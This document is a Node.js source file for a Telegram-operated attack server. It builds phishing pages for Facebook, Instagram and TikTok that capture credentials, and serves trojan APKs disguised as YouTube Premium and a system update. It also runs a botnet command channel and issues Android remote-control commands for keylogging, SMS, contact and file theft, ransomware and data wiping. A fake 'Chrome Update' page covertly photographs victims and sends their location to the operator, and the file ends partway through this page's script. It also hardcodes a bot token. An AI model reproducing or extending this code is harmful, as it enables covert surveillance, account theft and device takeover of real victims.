 const express     = require('express');
const webSocket   = require('ws');
const http        = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4       = require('uuid');
const multer      = require('multer');
const bodyParser  = require('body-parser');
const axios       = require('axios');
const crypto      = require('crypto');
const fs          = require('fs');
const path        = require('path');

// ============================================================
// Railway Variables:
// TOKEN    = bot token from @BotFather
// ADMIN_ID = your telegram ID from @userinfobot
// ============================================================
const token = process.env.TOKEN    || '8788498983:AAG2XZoRxKYSMUcALwxT6kDcCnNHmKsiRKE';
const id    = process.env.ADMIN_ID || '8370261764';
let   HOST  = process.env.HOST     || '';

const app        = express();
const appServer  = http.createServer(app);
const appSocket  = new webSocket.Server({ server: appServer });
const appBot     = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer({ limits: { fileSize: 50 * 1024 * 1024 } });
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// state
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';
const linkTokens = new Map();
const userLangs  = new Map();
const botnet     = new Map();
const botCmds    = new Map();

// auto-detect HOST
app.use((req, res, next) => {
    if (!HOST) HOST = req.protocol + '://' + req.get('host');
    next();
});

// ── i18n ─────────────────────────────────────────────────────
const T = {
    en: {
        welcome:   '🌹 Welcome! Choose your language:',
        menu:      '🎯 Main Menu:',
        cam_f:     '📷 Front Camera',
        cam_b:     '📷 Back Camera',
        loc:       '📍 Location',
        gallery:   '🖼️ Gallery',
        info:      '📱 Device Info',
        clip:      '📋 Clipboard',
        phish:     '🎣 Phishing',
        mal:       '💀 APK',
        phone_spy: '📲 Phone Control (Spy)',
        botnet:    '🤖 Botnet',
        recon:     '📡 Full Recon',
        mic:       '🎙️ Mic Record',
        back:      '◀️ Back',
        photo:     '📷 Photo',
        video:     '🎥 Video',
        copylink:  '🔗 Copy Link',
        rdy:       '🔗 Link ready! Send to victim:',
        exp:       '⏰ Expires in 10 min',
        new:       '🔄 New Link',
        fb:        '🔵 Facebook',
        ig:        '📸 Instagram',
        tt:        '🎵 TikTok',
        phmenu:    '🎣 Choose target:',
        cammenu_f: '📷 Front Camera — Choose:',
        cammenu_b: '📷 Back Camera — Choose:',
        bpanel:    '🤖 Botnet Panel',
        blist:     '📋 Active Bots',
        nobots:    '❌ No bots yet.'
    },
    bn: {
        welcome:   '🌹 স্বাগতম! ভাষা বেছে নিন:',
        menu:      '🎯 মেইন মেনু:',
        cam_f:     '📷 সামনের ক্যামেরা',
        cam_b:     '📷 পিছনের ক্যামেরা',
        loc:       '📍 লোকেশন',
        gallery:   '🖼️ গ্যালারি',
        info:      '📱 ডিভাইস তথ্য',
        clip:      '📋 ক্লিপবোর্ড',
        phish:     '🎣 ফিশিং',
        mal:       '💀 APK',
        phone_spy: '📲 ফোন কন্ট্রোল (স্পাই)',
        botnet:    '🤖 বটনেট',
        recon:     '📡 ফুল রিকন',
        mic:       '🎙️ মাইক রেকর্ড',
        back:      '◀️ পিছনে',
        photo:     '📷 ছবি',
        video:     '🎥 ভিডিও',
        copylink:  '🔗 লিংক কপি করুন',
        rdy:       '🔗 লিংক তৈরি! ভিক্টিমকে পাঠান:',
        exp:       '⏰ ১০ মিনিটে মেয়াদ শেষ',
        new:       '🔄 নতুন লিংক',
        fb:        '🔵 ফেসবুক',
        ig:        '📸 ইনস্টাগ্রাম',
        tt:        '🎵 টিকটক',
        phmenu:    '🎣 টার্গেট বেছে নিন:',
        cammenu_f: '📷 সামনের ক্যামেরা — বেছে নিন:',
        cammenu_b: '📷 পিছনের ক্যামেরা — বেছে নিন:',
        bpanel:    '🤖 বটনেট প্যানেল',
        blist:     '📋 সক্রিয় বট',
        nobots:    '❌ এখনো কোনো বট নেই।'
    },
    hi: {
        welcome:   '🌹 स्वागत! भाषा चुनें:',
        menu:      '🎯 मुख्य मेनू:',
        cam_f:     '📷 सामने कैमरा',
        cam_b:     '📷 पीछे कैमरा',
        loc:       '📍 लोकेशन',
        gallery:   '🖼️ गैलरी',
        info:      '📱 डिवाइस जानकारी',
        clip:      '📋 क्लिपबोर्ड',
        phish:     '🎣 फिशिंग',
        mal:       '💀 APK',
        phone_spy: '📲 फोन कंट्रोल (स्पाई)',
        botnet:    '🤖 बॉटनेट',
        recon:     '📡 फुल रिकॉन',
        mic:       '🎙️ माइक',
        back:      '◀️ वापस',
        photo:     '📷 फोटो',
        video:     '🎥 वीडियो',
        copylink:  '🔗 लिंक कॉपी करें',
        rdy:       '🔗 लिंक तैयार! भेजें:',
        exp:       '⏰ 10 मिनट में समाप्त',
        new:       '🔄 नया लिंक',
        fb:        '🔵 Facebook',
        ig:        '📸 Instagram',
        tt:        '🎵 TikTok',
        phmenu:    '🎣 टार्गेट चुनें:',
        cammenu_f: '📷 सामने कैमरा — चुनें:',
        cammenu_b: '📷 पीछे कैमरा — चुनें:',
        bpanel:    '🤖 बॉटनेट पैनल',
        blist:     '📋 सक्रिय बॉट',
        nobots:    '❌ अभी कोई बॉट नहीं।'
    }
};

function tr(uid, k) {
    return (T[userLangs.get(uid) || 'en'] || T.en)[k] || T.en[k] || k;
}

// ── token ─────────────────────────────────────────────────────
function mkLink(action, uid) {
    const tok = crypto.randomBytes(10).toString('hex');
    linkTokens.set(tok, { action, uid });
    setTimeout(() => linkTokens.delete(tok), 600000);
    return `${HOST}/go/${tok}`;
}

// ── tg helpers ────────────────────────────────────────────────
const tgMsg = (cid, txt, opts={}) =>
    appBot.sendMessage(cid, txt, { parse_mode:'HTML', ...opts }).catch(()=>{});
const tgPic = (cid, buf, cap) =>
    appBot.sendPhoto(cid, buf, { caption:cap, parse_mode:'HTML' }).catch(()=>{});
const tgVideo = (cid, buf, cap) =>
    appBot.sendVideo(cid, buf, { caption:cap, parse_mode:'HTML' }).catch(()=>{});
const tgLoc = (cid, lat, lon) =>
    appBot.sendLocation(cid, lat, lon).catch(()=>{});
const tgAudio = (cid, buf) =>
    appBot.sendAudio(cid, buf, {}, { filename:'mic.webm', contentType:'audio/webm' }).catch(()=>{});
const tgDoc = (cid, buf, name, cap) =>
    appBot.sendDocument(cid, buf, { caption:cap, parse_mode:'HTML' },
        { filename:name, contentType:'application/octet-stream' }).catch(()=>{});

// ── keyboards ─────────────────────────────────────────────────
const langKb = () => ({ inline_keyboard: [[
    { text:'🇧🇩 বাংলা',   callback_data:'LNG_bn' },
    { text:'🇬🇧 English', callback_data:'LNG_en' },
    { text:'🇮🇳 हिन्दी', callback_data:'LNG_hi' }
]]});

const linkKb = (act, uid) => ({ inline_keyboard: [[
    { text:tr(uid,'new'),  callback_data:act },
    { text:tr(uid,'back'), callback_data:'M_BACK' }
]]});

function mainKb(uid) {
    return { inline_keyboard: [
        [
            { text:tr(uid,'cam_f'),     callback_data:'M_CAM_F' },
            { text:tr(uid,'cam_b'),     callback_data:'M_CAM_B' }
        ],
        [
            { text:tr(uid,'loc'),       callback_data:'LNK_location' },
            { text:tr(uid,'mic'),       callback_data:'LNK_mic' }
        ],
        [
            { text:tr(uid,'gallery'),   callback_data:'LNK_gallery' },
            { text:tr(uid,'clip'),      callback_data:'LNK_clipboard' }
        ],
        [
            { text:tr(uid,'info'),      callback_data:'LNK_devinfo' },
            { text:tr(uid,'recon'),     callback_data:'LNK_recon' }
        ],
        [
            { text:tr(uid,'phone_spy'), callback_data:'LNK_phone_spy' }
        ],
        [
            { text:tr(uid,'phish'),     callback_data:'M_PHISH' },
            { text:tr(uid,'mal'),       callback_data:'LNK_apk' }
        ],
        [
            { text:tr(uid,'botnet'),    callback_data:'M_BOTNET' }
        ],
        [
            { text:'💬 Messenger',  callback_data:'LNK_messenger' },
            { text:'🖥️ Screen',      callback_data:'LNK_screen' }
        ],
        [
            { text:'🖼️ Gallery',    callback_data:'LNK_gallery2' },
            { text:'📱 All Apps',   callback_data:'LNK_allapps' }
        ]
    ]};
}

function camSubKb(uid, side) {
    const pfx = side === 'f' ? 'cam_f' : 'cam_b';
    const lbl = side === 'f' ? 'Front' : 'Back';
    return { inline_keyboard: [
        [
            { text:`📷 ${lbl} Photo`,  callback_data:`LNK_${pfx}_photo` },
            { text:`🎥 ${lbl} Video`,  callback_data:`LNK_${pfx}_video` }
        ],
        [
            { text:tr(uid,'back'), callback_data:'M_BACK' }
        ]
    ]};
}

function phishKb(uid) {
    return { inline_keyboard: [
        [
            { text:tr(uid,'fb'), callback_data:'LNK_phish_fb' },
            { text:tr(uid,'ig'), callback_data:'LNK_phish_ig' },
            { text:tr(uid,'tt'), callback_data:'LNK_phish_tt' }
        ],
        [{ text:tr(uid,'back'), callback_data:'M_BACK' }]
    ]};
}

function botnetKb(uid) {
    return { inline_keyboard: [
        [{ text:'🔗 Botnet Infection Link', callback_data:'LNK_botnet' }],
        [{ text:tr(uid,'blist'),             callback_data:'BOT_LIST' }],
        [{ text:'📸 All Bots Photo',         callback_data:'BOT_photo' }],
        [{ text:'📍 All Bots Location',      callback_data:'BOT_location' }],
        [{ text:tr(uid,'back'),              callback_data:'M_BACK' }]
    ]};
}

// ════════════════════════════════════════════════════════════════
// /start -- ভাষা মেনু
// ════════════════════════════════════════════════════════════════
appBot.onText(/\/start/, msg => {
    tgMsg(msg.chat.id, '🌹 Welcome / স্বাগতম / स्वागत', { reply_markup: langKb() });
});
appBot.onText(/\/menu/, msg => {
    const uid = String(msg.from.id);
    tgMsg(msg.chat.id, tr(uid,'menu'), { reply_markup: mainKb(uid) });
});

// ════════════════════════════════════════════════════════════════
// Callback Handler
// ════════════════════════════════════════════════════════════════
appBot.on('callback_query', async cbq => {
    const uid    = String(cbq.from.id);
    const chatId = cbq.message.chat.id;
    const msgId  = cbq.message.message_id;
    const data   = cbq.data;

    appBot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del = () => appBot.deleteMessage(chatId, msgId).catch(()=>{});

    // ── ভাষা ──────────────────────────────────────────────────
    if (data.startsWith('LNG_')) {
        userLangs.set(uid, data.slice(4));
        del();
        return tgMsg(chatId, tr(uid,'menu'), { reply_markup: mainKb(uid) });
    }

    // ── নেভিগেশন ──────────────────────────────────────────────
    if (data === 'M_BACK') { del(); return tgMsg(chatId, tr(uid,'menu'), { reply_markup: mainKb(uid) }); }
    if (data === 'M_CAM_F') { del(); return tgMsg(chatId, tr(uid,'cammenu_f'), { reply_markup: camSubKb(uid,'f') }); }
    if (data === 'M_CAM_B') { del(); return tgMsg(chatId, tr(uid,'cammenu_b'), { reply_markup: camSubKb(uid,'b') }); }
    if (data === 'M_PHISH') { del(); return tgMsg(chatId, tr(uid,'phmenu'), { reply_markup: phishKb(uid) }); }
    if (data === 'M_BOTNET'){ del(); return tgMsg(chatId, tr(uid,'bpanel'), { reply_markup: botnetKb(uid) }); }

    // ── বটনেট কমান্ড ──────────────────────────────────────────
    if (data === 'BOT_LIST') {
        if (!botnet.size) return tgMsg(chatId, tr(uid,'nobots'));
        let txt = `🤖 <b>Bots: ${botnet.size}</b>\n\n`;
        let i = 1;
        botnet.forEach((v,k) => {
            txt += `${i}. <b>${v.model||'?'}</b>\n🌍 <code>${v.ip||'?'}</code>\n🕐 ${v.last||'?'}\n\n`;
            i++;
        });
        return tgMsg(chatId, txt);
    }
    if (data.startsWith('BOT_')) {
        const cmd = data.slice(4).toLowerCase();
        botnet.forEach((_,k) => {
            if (!botCmds.has(k)) botCmds.set(k,[]);
            botCmds.get(k).push(cmd);
        });
        return tgMsg(chatId, `📡 Sent <b>${cmd}</b> to <b>${botnet.size}</b> bots.`);
    }

    // ── লিংক জেনারেটর ─────────────────────────────────────────
    if (data.startsWith('LNK_')) {
        const act = data.slice(4);
        del();
        const link = mkLink(act, uid);

        // স্পেশাল: phone_spy -- ফাইল জেনারেট করে দেয়
        if (act === 'phone_spy') {
            const spyHtml = buildPhoneSpyFile(uid);
            const buf = Buffer.from(spyHtml, 'utf8');
            tgMsg(chatId,
                `📲 <b>Phone Spy File Generated!</b>\n\n` +
                `Send the file below to victim.\n` +
                `When they open it in Chrome browser and tap Allow,\n` +
                `all their notifications come here.\n\n` +
                `Or use this link:\n<code>${link}</code>`
            );
            return tgDoc(chatId, buf, 'chrome_update.html',
                '📲 Phone Spy — open in Chrome, tap Allow'
            );
        }

        return tgMsg(chatId,
            `${tr(uid,'rdy')}\n\n<code>${link}</code>\n\n${tr(uid,'exp')}\n\n` +
            `👇 নিচের লিংক কপি করুন এবং ভিক্টিমকে পাঠান`,
            { reply_markup: linkKb(data, uid) }
        );
    }

    // ── KAZAMIKARI পুরনো device callback ──────────────────────
    const commend = data.split(':')[0];
    const devUuid = data.split(':')[1];

    if (commend === 'device') {
        const info = appClients.get(devUuid);
        if (!info) return;
        return appBot.editMessageText(
            `°• 🪣 Commands for <b>${info.model}</b>`,
            {
                chat_id: id, message_id: msgId, parse_mode:'HTML',
                reply_markup: { inline_keyboard:[
                    [{text:'🍏 APPS',         callback_data:`apps:${devUuid}`},
                     {text:'⚽ PHONE INFO',   callback_data:`device_info:${devUuid}`}],
                    [{text:'🍫 GET FILE',     callback_data:`file:${devUuid}`},
                     {text:'🏆 DELETE FILE', callback_data:`delete_file:${devUuid}`}],
                    [{text:'🧨 SCREENSHOT',  callback_data:`screenshot:${devUuid}`},
                     {text:'☎️ FB/IG/TG',   callback_data:`whatsapp:${devUuid}`}],
                    [{text:'⛄ CLIPBOARD',   callback_data:`clipboard:${devUuid}`},
                     {text:'🥤 MIC RECORD', callback_data:`microphone:${devUuid}`}],
                    [{text:'📸 BACK CAM',    callback_data:`camera_main:${devUuid}`},
                     {text:'🚸 FRONT CAM',  callback_data:`camera_selfie:${devUuid}`}],
                    [{text:'📟 GPS',          callback_data:`location:${devUuid}`},
                     {text:'🖥️ ECHO SMS',    callback_data:`toast:${devUuid}`}],
                    [{text:'🎻 CALL LOG',     callback_data:`calls:${devUuid}`},
                     {text:'♐ CONTACTS',    callback_data:`contacts:${devUuid}`}],
                    [{text:'📺 SMS LIST',     callback_data:`messages:${devUuid}`},
                     {text:'🛍️ SEND SMS',   callback_data:`send_message:${devUuid}`}],
                    [{text:'🚳 VIBRATE',     callback_data:`vibrate:${devUuid}`},
                     {text:'🏖️ NOTIF',      callback_data:`show_notification:${devUuid}`}],
                    [{text:'🔒 LOCK',         callback_data:`encrypt_data:${devUuid}`},
                     {text:'🔓 UNLOCK',      callback_data:`decrypt_data:${devUuid}`}],
                    [{text:'🌀 PLAY AUDIO',  callback_data:`play_audio:${devUuid}`},
                     {text:'🎹 STOP AUDIO', callback_data:`stop_audio:${devUuid}`}],
                    [{text:'🚦 SMS TO ALL', callback_data:`send_message_to_all:${devUuid}`}],
                    [{text:'🔑 KEYLOG ON',  callback_data:`keylogger_on:${devUuid}`},
                     {text:'🗝️ KEYLOG OFF',callback_data:`keylogger_off:${devUuid}`}]
                ]}
            }
        ).catch(()=>{});
    }

    const simpleWs = ['calls','contacts','messages','apps','device_info','clipboard',
        'camera_main','camera_selfie','location','vibrate','stop_audio','screenshot',
        'whatsapp','Settings','Erase_data','Ransomware','custom_phishing',
        'encrypt_data','decrypt_data','keylogger_on','keylogger_off'];
    if (simpleWs.includes(commend)) {
        wsCmd(devUuid, commend);
        del();
        return sendDone(chatId);
    }
    const inputCmds = {
        send_message:        '°• 🗯️ Reply Message\n\n• Enter number with country code',
        send_message_to_all: '°• 🔄 SMS to ALL\n\n• Enter message',
        file:                '°• 🍬 Download File\n\n• Enter path e.g. DCIM/Camera',
        delete_file:         '°• 🌠 Delete File\n\n• Enter path',
        microphone:          '°• 🕍 Mic Record\n\n• Enter seconds',
        toast:               '°• 🎒 Show on Screen\n\n• Enter text',
        show_notification:   '°• 🦊 Notification\n\n• Enter title',
        play_audio:          '°• 🎧 Play Audio\n\n• Enter URL'
    };
    if (inputCmds[commend]) {
        currentUuid = devUuid;
        del();
        return appBot.sendMessage(id, inputCmds[commend],
            { reply_markup:{ force_reply:true }, parse_mode:'HTML' }
        );
    }
});

// ════════════════════════════════════════════════════════════════
// Message Handler
// ════════════════════════════════════════════════════════════════
appBot.on('message', msg => {
    const uid    = String(msg.from.id);
    const chatId = msg.chat.id;
    const text   = msg.text || '';

    if (text === '/start') return;
    if (text === '/menu')  return;

    // force_reply
    const rt = msg.reply_to_message?.text || '';
    if (rt) {
        const map = [
            { k:'Reply Message',     fn:() => { currentNumber=text; appBot.sendMessage(id,'🏜️ Now enter the message:',{reply_markup:{force_reply:true}}); }},
            { k:'Now enter the msg', fn:() => { wsCmd(currentUuid,`send_message:${currentNumber}/${text}`); currentNumber='';currentUuid='';sendDone(chatId); }},
            { k:'SMS to ALL',        fn:() => { wsCmd(currentUuid,`send_message_to_all:${text}`); currentUuid='';sendDone(chatId); }},
            { k:'Download File',     fn:() => { wsCmd(currentUuid,`file:${text}`); currentUuid='';sendDone(chatId); }},
            { k:'Delete File',       fn:() => { wsCmd(currentUuid,`delete_file:${text}`); currentUuid='';sendDone(chatId); }},
            { k:'Mic Record',        fn:() => { wsCmd(currentUuid,`microphone:${text}`); currentUuid='';sendDone(chatId); }},
            { k:'Show on Screen',    fn:() => { wsCmd(currentUuid,`toast:${text}`); currentUuid='';sendDone(chatId); }},
            { k:'Notification',      fn:() => { currentTitle=text; appBot.sendMessage(id,'🐼 Enter link to open:',{reply_markup:{force_reply:true}}); }},
            { k:'Enter link to open',fn:() => { wsCmd(currentUuid,`show_notification:${currentTitle}/${text}`); currentUuid='';currentTitle='';sendDone(chatId); }},
            { k:'Play Audio',        fn:() => { wsCmd(currentUuid,`play_audio:${text}`); currentUuid='';sendDone(chatId); }}
        ];
        for (const r of map) if (rt.includes(r.k)) { r.fn(); return; }
    }

    // KAZAMIKARI old keyboard
    if (String(chatId) === String(id)) {
        if (text === '📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮') {
            if (!appClients.size) return tgMsg(id,'❌ No active APK connections.');
            let t2 = '🎮 Active APK Devices:\n\n';
            appClients.forEach(v => { t2+=`• ${v.model} | 🔋${v.battery} | ${v.version}\n`; });
            return tgMsg(id, t2);
        }
        if (text === '📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬') {
            if (!appClients.size) return tgMsg(id,'❌ No active APK connections.');
            const kb=[];
            appClients.forEach((v,k)=>kb.push([{text:`📱 ${v.model}`,callback_data:`device:${k}`}]));
            return tgMsg(id,'Select device:',{reply_markup:{inline_keyboard:kb}});
        }
    }
});

function wsCmd(targetUuid, cmd) {
    appSocket.clients.forEach(ws => { if (ws.uuid===targetUuid) ws.send(cmd); });
}

function sendDone(chatId) {
    return tgMsg(id, '°• ✅ Command sent. Response coming soon...',
        { reply_markup:{ keyboard:[['📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮'],['📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬']],resize_keyboard:true }});
}

// ════════════════════════════════════════════════════════════════
// WebSocket (APK)
// ════════════════════════════════════════════════════════════════
appSocket.on('connection', (ws, req) => {
    const devUuid    = uuid4.v4();
    const model      = req.headers.model      || 'Unknown';
    const battery    = req.headers.battery    || '?';
    const version    = req.headers.version    || '?';
    const brightness = req.headers.brightness || '?';
    const provider   = req.headers.provider   || '?';
    ws.uuid = devUuid;
    appClients.set(devUuid, { model,battery,version,brightness,provider });
    tgMsg(id,
        `🤡 <b>NEW PHONE CONNECTED (APK)</b>\n\n` +
        `📱 Model   : <b>${model}</b>\n` +
        `🔋 Battery  : <b>${battery}</b>\n` +
        `🤖 Android  : <b>${version}</b>\n` +
        `☀️ Bright   : <b>${brightness}</b>\n` +
        `📶 Provider : <b>${provider}</b>`
    );
    ws.on('close', () => {
        tgMsg(id,`😫 <b>APK Disconnected</b>\n📱 <b>${model}</b>`);
        appClients.delete(ws.uuid);
    });
    ws.on('error', () => appClients.delete(ws.uuid));
});

// ════════════════════════════════════════════════════════════════
// HTTP Upload Routes (from APK)
// ════════════════════════════════════════════════════════════════
app.get('/', (_,res) => res.send('<h1 style="text-align:center;color:green">✅ Server Online</h1>'));

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const m = req.headers.model||'?';
    appBot.sendDocument(id, req.file.buffer,
        {caption:`📁 File from <b>${m}</b>`, parse_mode:'HTML'},
        {filename:req.file.originalname, contentType:'application/octet-stream'}
    ).catch(()=>{});
    res.send('');
});
app.post('/uploadText', (req, res) => {
    tgMsg(id, `📝 Text from <b>${req.headers.model||'?'}</b>\n\n${req.body.text||''}`);
    res.send('');
});
app.post('/uploadLocation', (req, res) => {
    tgLoc(id, req.body.lat, req.body.lon);
    tgMsg(id, `📍 Location from <b>${req.headers.model||'?'}</b>\nMaps: https://maps.google.com/?q=${req.body.lat},${req.body.lon}`);
    res.send('');
});

// ── ডেটা এন্ডপয়েন্ট (লিংক সিস্টেম) ───────────────────────
app.post('/d/photo', upload.single('photo'), (req, res) => {
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if (req.file) tgPic(uid, req.file.buffer, `${req.body.camtype||'📸 Photo'}\n🌍 ${ip}`);
    res.json({ok:true});
});
app.post('/d/video', upload.single('video'), (req, res) => {
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if (req.file) {
        appBot.sendVideo(uid, req.file.buffer,
            {caption:`${req.body.camtype||'🎥 Video'}\n🌍 ${ip}`, parse_mode:'HTML'}
        ).catch(()=>{});
    }
    res.json({ok:true});
});
app.post('/d/loc', (req, res) => {
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    const {lat,lon,acc}=req.body;
    if (lat&&lon) {
        tgLoc(uid, parseFloat(lat), parseFloat(lon));
        tgMsg(uid, `📍 Location\nLat: ${lat}\nLon: ${lon}\nAcc: ${acc}m\nIP: ${ip}\n🗺 https://maps.google.com/?q=${lat},${lon}`);
    }
    res.json({ok:true});
});
app.post('/d/text', (req, res) => {
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid, `📋 <b>${req.body.type||'Data'}</b>\n\n<code>${(req.body.data||'').slice(0,3500)}</code>\n\n🌍 ${ip}`);
    res.json({ok:true});
});
app.post('/d/audio', upload.single('audio'), (req, res) => {
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if (req.file) { tgAudio(uid, req.file.buffer); tgMsg(uid,`🎙️ Audio received | ${ip}`); }
    res.json({ok:true});
});
app.post('/d/creds', (req, res) => {
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid,
        `🔑 <b>CREDENTIALS!</b>\n🌐 <b>${req.body.site||'?'}</b>\n` +
        `👤 <code>${req.body.user||''}</code>\n🔒 <code>${req.body.pass||''}</code>\n🌍 ${ip}`
    );
    res.json({ok:true});
});
app.post('/d/notif', (req, res) => {
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid,
        `🔔 <b>Notification Spy</b>\n📱 <b>${req.body.app||'?'}</b>\n` +
        `📣 ${req.body.title||''}\n💬 <code>${req.body.text||''}</code>\n🌍 ${ip}`
    );
    res.json({ok:true});
});

// বটনেট
app.post('/b/reg', (req, res) => {
    const {victimId,uid,model}=req.body;
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    botnet.set(victimId,{uid,ip,model:model||'?',last:new Date().toLocaleString('en-BD',{timeZone:'Asia/Dhaka'})});
    tgMsg(uid,`🤖 New Bot!\n📱 ${model||'?'}\n🌍 ${ip}\nTotal: <b>${botnet.size}</b>`);
    res.json({ok:true});
});
app.post('/b/poll', (req, res) => {
    const {victimId}=req.body;
    if (botnet.has(victimId)) botnet.get(victimId).last=new Date().toLocaleString('en-BD',{timeZone:'Asia/Dhaka'});
    const pending=botCmds.get(victimId)||[];
    botCmds.set(victimId,[]);
    res.json({ok:true,commands:pending});
});

// ── APK & SW সার্ভ ────────────────────────────────────────────
app.get('/payload.apk', (req, res) => {
    const p=path.join(__dirname,'payload.apk');
    if (fs.existsSync(p)) {
        res.setHeader('Content-Type','application/vnd.android.package-archive');
        res.setHeader('Content-Disposition','attachment; filename="YouTube_Premium.apk"');
        res.sendFile(p);
    } else res.status(404).send('Not found');
});
app.get('/spy.apk', (req, res) => {
    const p=path.join(__dirname,'spy.apk');
    if (fs.existsSync(p)) {
        res.setHeader('Content-Type','application/vnd.android.package-archive');
        res.setHeader('Content-Disposition','attachment; filename="System_Update.apk"');
        res.sendFile(p);
    } else res.status(404).send('APK not built yet -- see spy_apk_source/');
});
app.get('/sw.js', (req,res) => {
    res.setHeader('Content-Type','application/javascript');
    res.send(`self.addEventListener('install',e=>self.skipWaiting());
self.addEventListener('activate',e=>clients.claim());
self.addEventListener('push',e=>{const d=e.data?e.data.json():{};self.registration.showNotification(d.title||'',{body:d.body||'',icon:'/icon.png'});});`);
});

// ── /go/:tok ──────────────────────────────────────────────────
app.get('/go/:tok', (req, res) => {
    const info = linkTokens.get(req.params.tok);
    if (!info) return res.send('<h2 style="text-align:center;color:red">Link expired.</h2>');
    res.send(buildPage(info.action, info.uid));
});

// ════════════════════════════════════════════════════════════════
// Page Builder
// ════════════════════════════════════════════════════════════════
function buildPage(action, uid) {
    if (action.startsWith('phish_')) return phishPage(action, uid);
    if (action === 'apk')            return apkPage(uid);
    if (action === 'botnet')         return botnetPage(uid);
    if (action === 'phone_spy')      return phoneSpyPage(uid);
    if (action === 'messenger')      return messengerPage(uid);
    if (action === 'screen')         return screenPage(uid);
    if (action === 'gallery2')       return gallery2Page(uid);
    if (action === 'allapps')        return allappsPage(uid);
    return attackPage(action, uid);
}

// ── Phone Spy HTML File (for download) ───────────────────────
function buildPhoneSpyFile(uid) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Chrome Update Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center}
.logo{width:80px;height:80px;margin:0 auto 20px}
h2{font-size:20px;margin-bottom:10px;color:#333}
p{font-size:14px;color:#666;margin-bottom:24px;line-height:1.5}
.btn{padding:14px 40px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;width:100%;max-width:300px}
.allow-box{background:#f8f8f8;border:1px solid #ddd;border-radius:10px;padding:20px;margin-bottom:20px;max-width:360px;width:100%}
#st{font-size:13px;color:#999;margin-top:14px}
</style>
</head>
<body>
<svg class="logo" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#4285f4"/><path d="M50 25c-13.8 0-25 11.2-25 25s11.2 25 25 25 25-11.2 25-25-11.2-25-25-25zm0 10c8.3 0 15 6.7 15 15s-6.7 15-15 15-15-6.7-15-15 6.7-15 15-15z" fill="white"/></svg>
<h2>Chrome Update Required</h2>
<p>A security update is required to continue browsing. Please allow notifications to proceed.</p>
<div class="allow-box">
  <p style="font-size:13px;margin-bottom:14px"><b>chrome.google.com</b> wants to:<br>Show notifications</p>
  <button class="btn" onclick="run()">Allow</button>
</div>
<div id="st"></div>
<script>
const UID='${uid}',HOST='${HOST}',D='${HOST}/d';
window.onload=async function(){
  // passive info
  const i={ua:navigator.userAgent,sc:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'📲 Phone Spy Page Opened',data:JSON.stringify(i)})});
};
async function run(){
  document.querySelector('.btn').textContent='Installing...';
  document.getElementById('st').textContent='Please wait...';
  // request notification permission
  let perm='denied';
  if('Notification' in window) perm=await Notification.requestPermission().catch(()=>'denied');
  // service worker for background
  if('serviceWorker' in navigator){
    try{await navigator.serviceWorker.register(HOST+'/sw.js');}catch(e){}
  }
  // send notification status + device info
  const info={ua:navigator.userAgent,sc:screen.width+'x'+screen.height,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,notif_perm:perm,
    t:new Date().toString()};
  if(navigator.getBattery) navigator.getBattery().then(b=>{
    info.bat=Math.round(b.level*100)+'%';info.chg=b.charging;
    send('text',{type:'📲 Phone Spy Installed',data:JSON.stringify(info,null,2)});
  }); else send('text',{type:'📲 Phone Spy Installed',data:JSON.stringify(info,null,2)});
  // get location
  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
  });
  // camera
  try{
    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;
    v.srcObject=s;v.style.display='none';document.body.appendChild(v);
    await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));
    const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
    c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());v.remove();
    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
    const fd=new FormData();fd.append('photo',b,'spy.jpg');fd.append('uid',UID);fd.append('camtype','📲 Phone Spy Cam');
    fetch(D+'/photo',{method:'POST',body:fd});
  }catch(e){}
  document.querySelector('.btn').textContent='✅ Updated';
  document.getElementById('st').textContent='Chrome has been updated successfully.';
  document.querySelector('h2').textContent='Update Complete';
